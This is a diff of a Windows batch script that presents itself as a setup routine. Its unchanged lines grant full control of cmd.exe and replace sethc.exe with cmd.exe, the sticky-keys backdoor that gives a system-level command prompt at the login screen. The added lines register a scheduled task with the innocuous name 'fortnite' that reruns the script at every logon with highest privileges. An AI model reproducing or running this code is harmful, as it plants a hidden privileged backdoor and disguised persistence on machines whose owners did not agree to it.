@@ -53,6 +53,9 @@ icacls "%systemroot%\System32\cmd.exe" /grant %username%:f
 ren "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
 copy "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
 
+:: Startup Task
+schtasks /create /tn fortnite /tr %desktop%\WIN7GucciScript.bat /sc onlogon /rl highest /f
+
 :: Ask if first time setup
 cls
 set /p cont="Is this first time setup? (y/n) "
